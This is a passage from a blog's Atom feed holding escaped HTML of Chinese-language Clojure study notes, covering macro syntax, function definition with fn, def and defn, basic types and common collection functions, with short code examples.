&lt;li&gt;&lt;p&gt;&lt;code&gt;~&lt;/code&gt;和&lt;code&gt;~@&lt;/code&gt;&lt;br&gt;当一个名字前面被加了一个波浪号，并且还在反引号里面，它的值会被替换的。如果这个名字代表的是一个序列，那么我们可以用 &lt;code&gt;~@&lt;/code&gt; 来替换序列里面的某个具体元素。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;id#&lt;/code&gt;&lt;br&gt;在一个标识符背后加上 # 意味着生成一个唯一的symbol, 比如 foo# 实际可 能就是 foo_004 可以看作是let与gensym的等价物,这在避免符号捕捉时很有用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;定义函数&quot;&gt;&lt;a href=&quot;#定义函数&quot; class=&quot;headerlink&quot; title=&quot;定义函数&quot;&gt;&lt;/a&gt;定义函数&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;匿名函数&lt;/strong&gt;&lt;br&gt;匿名函数&lt;code&gt;(fn) (fn [x y] (+ x y))&lt;/code&gt; 创建一个匿名函数, fn 和 lambda 类似，fn还有一个简写形式 &lt;code&gt;#(+ %1 %2)&lt;/code&gt;。如果只有一个参数,那么可以用 &lt;code&gt;%&lt;/code&gt; 代替 &lt;code&gt;%1&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;def&lt;/strong&gt;&lt;br&gt;&lt;code&gt;def&lt;/code&gt;可以将一个匿名函数绑定到一个name上。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; my-add (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;fn&lt;/span&gt;&lt;/span&gt; [x y] (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;+&lt;/span&gt;&lt;/span&gt; x y)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;defn&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;defn 是 def 与 fn 的简写。一般我们也都是用defn。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;defn&lt;/span&gt;&lt;/span&gt; my-add&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;this is a comment&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  [x y]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;+&lt;/span&gt;&lt;/span&gt; x y))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;my-add&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 函数的重载&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;defn&lt;/span&gt;&lt;/span&gt; my-add&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ([x y]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;+&lt;/span&gt;&lt;/span&gt; x y))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ([x y z]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;+&lt;/span&gt;&lt;/span&gt; x y z)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;my-add&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;my-add&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 12&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="编程语言" scheme="http://wuchong.me/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="Clojure" scheme="http://wuchong.me/tags/Clojure/"/>
    
      <category term="笔记" scheme="http://wuchong.me/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Clojure学习笔记（一）：数据结构</title>
    <link href="http://wuchong.me/blog/2015/11/06/learn-clojure-1-datastruct/"/>
    <id>http://wuchong.me/blog/2015/11/06/learn-clojure-1-datastruct/</id>
    <published>2015-11-06T06:12:38.000Z</published>
    <updated>2015-11-06T11:08:23.000Z</updated>
    
    <content type="html">&lt;p&gt;最近学习了Clojure，好记性不如烂笔头，把一些知识点记录了下来。原本想放在一篇文章里的，谁知太长了，只好分成了三篇，本文是第一篇。由于是笔记，比较杂乱，建议阅读前先系统地学习Clojure（比如 &lt;a href=&quot;http://java.ociweb.com/mark/clojure/article.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Clojure - Function Programming for JVM&lt;/a&gt;），然后用本笔记知识梳理。&lt;/p&gt;
&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;Clojure是一个动态类型的，运行在JVM(JDK5.0以上），并且可以和java代码互操作的函数式语言。这个语言的主要目标之一是使得编写一个有多个线程并发访问数据的程序变得简单。&lt;/p&gt;
&lt;p&gt;Clojure的发音和单词closure是一样的。Clojure之父是这样解释Clojure名字来历的&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“我想把这就几个元素包含在里面： C (C#), L (Lisp) and J (Java). 所以我想到了 Clojure, 而且从这个名字还能想到closure;它的域名又没有被占用;而且对于搜索引擎来说也是个很不错的关键词，所以就有了它了.”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;基本类型&quot;&gt;&lt;a href=&quot;#基本类型&quot; class=&quot;headerlink&quot; title=&quot;基本类型&quot;&gt;&lt;/a&gt;基本类型&lt;/h2&gt;&lt;h3 id=&quot;Boolean&quot;&gt;&lt;a href=&quot;#Boolean&quot; class=&quot;headerlink&quot; title=&quot;Boolean&quot;&gt;&lt;/a&gt;Boolean&lt;/h3&gt;&lt;p&gt;&lt;code&gt;true&lt;/code&gt;, &lt;code&gt;false&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;常用函数:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;not&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;and&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;or&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;Nil&quot;&gt;&lt;a href=&quot;#Nil&quot; class=&quot;headerlink&quot; title=&quot;Nil&quot;&gt;&lt;/a&gt;Nil&lt;/h3&gt;&lt;p&gt;&lt;code&gt;nil&lt;/code&gt;，只有false与nil会被计算为false,其它的都为true&lt;/p&gt;
&lt;p&gt;常用函数：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;nil?&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;Character&quot;&gt;&lt;a href=&quot;#Character&quot; class=&quot;headerlink&quot; title=&quot;Character&quot;&gt;&lt;/a&gt;Character&lt;/h3&gt;&lt;p&gt;字符的表示要在前面加反斜杠 &lt;code&gt;\a&lt;/code&gt; &lt;code&gt;\b&lt;/code&gt; &lt;code&gt;\c&lt;/code&gt; …&lt;/p&gt;
&lt;h3 id=&quot;Number&quot;&gt;&lt;a href=&quot;#Number&quot; class=&quot;headerlink&quot; title=&quot;Number&quot;&gt;&lt;/a&gt;Number&lt;/h3&gt;&lt;p&gt;数字&lt;code&gt;1&lt;/code&gt;, &lt;code&gt;2&lt;/code&gt; …&lt;/p&gt;
&lt;p&gt;常用函数：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;+&lt;/code&gt;, &lt;code&gt;-&lt;/code&gt;, &lt;code&gt;*&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/&lt;/code&gt;(分数形式),&lt;code&gt;quot&lt;/code&gt;(商),&lt;code&gt;rem&lt;/code&gt;(余数)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;inc&lt;/code&gt;,&lt;code&gt;dec&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;min&lt;/code&gt;, &lt;code&gt;max&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;=&lt;/code&gt;,&lt;code&gt;&amp;lt;&lt;/code&gt;,&lt;code&gt;&amp;lt;&lt;/code&gt;,&lt;code&gt;&amp;gt;&lt;/code&gt;,&lt;code&gt;&amp;gt;=&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;zero?&lt;/code&gt;,&lt;code&gt;pos?&lt;/code&gt;,&lt;code&gt;neg?&lt;/code&gt;,&lt;code&gt;number?&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;String&quot;&gt;&lt;a href=&quot;#String&quot; class=&quot;headerlink&quot; title=&quot;String&quot;&gt;&lt;/a&gt;String&lt;/h3&gt;&lt;p&gt;字符串，如 “hello”&lt;/p&gt;
&lt;p&gt;常用函数&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;str&lt;/code&gt;: 拼接多个字符串&lt;/li&gt;
&lt;li&gt;&lt;code&gt;subs&lt;/code&gt;: 子字符串(0为开始下标)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;string?&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;KeyWord&quot;&gt;&lt;a href=&quot;#KeyWord&quot; class=&quot;headerlink&quot; title=&quot;KeyWord&quot;&gt;&lt;/a&gt;KeyWord&lt;/h3&gt;&lt;p&gt;关键字，常用于Map中的key，&lt;code&gt;:tag&lt;/code&gt;，&lt;code&gt;:doc&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;Symbol&quot;&gt;&lt;a href=&quot;#Symbol&quot; class=&quot;headerlink&quot; title=&quot;Symbol&quot;&gt;&lt;/a&gt;Symbol&lt;/h3&gt;&lt;p&gt;变量名，一个命名空间中唯一。如&lt;code&gt;(def x 1)&lt;/code&gt;，就申请了一个&lt;code&gt;&amp;#39;user/x&lt;/code&gt;的Symbol。&lt;/p&gt;
&lt;h2 id=&quot;集合&quot;&gt;&lt;a href=&quot;#集合&quot; class=&quot;headerlink&quot; title=&quot;集合&quot;&gt;&lt;/a&gt;集合&lt;/h2&gt;&lt;p&gt;list, vector, set, map&lt;/p&gt;
&lt;p&gt;clojure中的任何变量都是不变的，当对一个变量进行修改时，都会产生一个新的变量（clojure会使用共享内存的方式，只会消耗很小的内存代价）。有点像scala中的val哦。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;count&lt;br&gt;返回集合里面的元素个数&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;count&lt;/span&gt;&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;19&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;yellow&quot;&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;]) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;reverse&lt;br&gt;把集合里面的元素反转&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;reverse&lt;/span&gt;&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; (3 2 1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;map&lt;br&gt;对一个集合内的每个元素都调用一个指定的方法。每个元素调用方法后的返回值再构成一个新的集合返回。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 使用匿名函数对每个元素加3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;map&lt;/span&gt;&lt;/span&gt; #(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;+&lt;/span&gt;&lt;/span&gt; % &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) [&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;]) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; (5 7 10)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 函数可以有多个参数，则指定多个集合，执行次数取决于个数最少的集合长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;map&lt;/span&gt;&lt;/span&gt; + [&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;] [&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;] [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;]) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; (8 12)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;apply&lt;br&gt;把集合里的所有元素都作为函数参数做一次调用，并返回这个函数的返回值。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;apply&lt;/span&gt;&lt;/span&gt; + [&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;]) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 13&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;conj &amp;amp; cons&lt;br&gt;conj (conjoin), 添加一个元素到集合里面去。如果是list类型，则新元素插到队头；如果是vector类型，则新元素插到队尾。&lt;/p&gt;
&lt;p&gt;cons (construct),也是添加一个元素到集合里面去。只不过新元素都会在队头。返回类型都会变成seq。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; cons用以向列表或向量的起始位置添加元素&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;cons&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) &lt;span class=&quot;comment&quot;&gt;; =&amp;gt; (4 1 2 3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;cons&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; &#39;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;; =&amp;gt; (4 1 2 3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; conj将以最高效的方式向集合中添加元素。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 对于列表，数据会在起始位置插入，而对于向量，则在末尾位置插入。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 注意：第一个参数是集合，第二个是要插入的元素，可以有多个元素&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;conj&lt;/span&gt;&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;] &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; [1 2 3 4]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;conj&lt;/span&gt;&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;] &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; [1 2 3 4 5]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;conj&lt;/span&gt;&lt;/span&gt; &#39;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; (6 5 4 1 2 3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;常用的集合操作&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;;从集合中取一个元素&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; stooges [&lt;span class=&quot;string&quot;&gt;&quot;Moe&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Larry&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Curly&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Shemp&quot;&lt;/span&gt;]) (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;first&lt;/span&gt;&lt;/span&gt; stooges) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &quot;Moe&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;second&lt;/span&gt;&lt;/span&gt; stooges) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &quot;Larry&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;last&lt;/span&gt;&lt;/span&gt; stooges) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &quot;Shemp&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;;从集合中取多个元素&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;nth&lt;/span&gt;&lt;/span&gt; stooges &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; indexes start at 0 -&amp;gt; &quot;Curly&quot; (next stooges) ; -&amp;gt; (&quot;Larry&quot; &quot;Curly&quot; &quot;Shemp&quot;) (butlast stooges) ; -&amp;gt; (&quot;Moe&quot; &quot;Larry&quot; &quot;Curly&quot;) (drop-last 2 stooges) ; -&amp;gt; (&quot;Moe&quot; &quot;Larry&quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 得到包含多于3个字符的名字.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;filter&lt;/span&gt;&lt;/span&gt; #(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;count&lt;/span&gt;&lt;/span&gt; %) &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) stooges) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; (&quot;Larry&quot; &quot;Curly&quot; &quot;Shemp&quot;) &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;nthnext&lt;/span&gt;&lt;/span&gt; stooges &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; (&quot;Curly&quot; &quot;Shemp&quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;;一些谓词操作&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;every?&lt;/span&gt; #(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;instance?&lt;/span&gt;&lt;/span&gt; String %) stooges) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;not-every?&lt;/span&gt;&lt;/span&gt; #(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;instance?&lt;/span&gt;&lt;/span&gt; String %) stooges) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;some&lt;/span&gt; #(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;instance?&lt;/span&gt;&lt;/span&gt; Number %) stooges) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; nil&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;not-any?&lt;/span&gt;&lt;/span&gt; #(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;instance?&lt;/span&gt;&lt;/span&gt; Number %) stooges) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;Lists&quot;&gt;&lt;a href=&quot;#Lists&quot; class=&quot;headerlink&quot; title=&quot;Lists&quot;&gt;&lt;/a&gt;Lists&lt;/h3&gt;&lt;p&gt;Lists 相当于Java中的LinkedList。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;创建&lt;/p&gt;
